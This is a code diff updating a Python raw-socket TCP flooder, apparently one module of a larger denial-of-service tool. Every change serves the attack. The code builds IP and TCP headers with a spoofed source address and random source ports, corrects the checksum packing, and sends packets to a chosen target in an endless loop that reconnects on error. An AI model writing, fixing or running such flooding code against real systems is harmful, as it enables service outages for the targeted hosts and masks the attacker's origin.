@@ -2,7 +2,7 @@ from role import flooder
 from time import sleep
 from struct import pack
 from socket import socket, inet_aton, htons
-from socket import AF_INET, SOCK_RAW, IPPROTO_RAW
+from socket import AF_INET, SOCK_RAW, IPPROTO_RAW, IPPROTO_TCP
 from socket import error as socket_error
 from random import randint
 from sys import exit
@@ -11,12 +11,11 @@ from sys import exit
 class RAWFlooder(flooder.Flooder):
 	def __init__(self, ip, port):
 		flooder.Flooder.__init__(self, ip, port)
-		self.socket_type = 3
-		self.socket_protocol = 6
 
 	def run(self):
 		try:
 			s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)
+			s.connect((self.ip, int(self.port)))
 		except socket_error:
 			exit()
 
@@ -28,10 +27,10 @@ class RAWFlooder(flooder.Flooder):
 		ip_ver = 4
 		ip_tos = 0
 		ip_tot_len = 0
-		ip_id = randint(0, 100000)
+		ip_id = randint(0, 65534)
 		ip_frag_off = 0
 		ip_ttl = 255
-		ip_proto = self.socket_protocol
+		ip_proto = IPPROTO_TCP
 		ip_check = 0
 		ip_saddr = inet_aton(source_ip)
 		ip_daddr = inet_aton(self.ip)
@@ -53,7 +52,7 @@ class RAWFlooder(flooder.Flooder):
 		)
 
 		# TCP header
-		tcp_source = randint(1, 65535)
+		tcp_source = randint(0, 65534)
 		tcp_dest = int(self.port)
 		tcp_seq = 454
 		tcp_ack_seq = 0
@@ -94,7 +93,7 @@ class RAWFlooder(flooder.Flooder):
 		tcp_length = len(tcp_header) + len(msg)
 
 		# Pack the pseudo header
-		psh = pack('!4s4sBBH', source_address, dest_address, placeholder, self.socket_protocol, tcp_length)
+		psh = pack('!4s4sBBH', source_address, dest_address, placeholder, IPPROTO_TCP, tcp_length)
 		psh = psh + tcp_header + pack('!' + str(len(msg)) + 's', msg)
 
 		# Verify bytes on the pseudo header
@@ -110,7 +109,7 @@ class RAWFlooder(flooder.Flooder):
 			tcp_offset_res,
 			tcp_flags,
 			tcp_window
-		) + pack('H', tcp_check) + pack('!H', tcp_urg_ptr)
+		) + pack('!H', tcp_check) + pack('!H', tcp_urg_ptr)
 
 		packet = ip_header + tcp_header + msg
 
@@ -118,11 +117,20 @@ class RAWFlooder(flooder.Flooder):
 		try:
 			while True:
 				try:
-					s.sendto(packet, (self.ip, int(self.port)))
+					s.send(packet)
+					try:
+						s.settimeout(5)
+						resp = s.recv(1024)
+					except socket_error as e:
+						print(e)
+						s.close()
+						s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)
+						s.connect((self.ip, int(self.port)))
+
 				except socket_error:
 					try:
 						s.close()
-						s = socket(AF_INET, self.socket_type)
+						s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)
 						s.connect((self.ip, int(self.port)))
 						print('Socket error...reconnecting')
 					except socket_error:
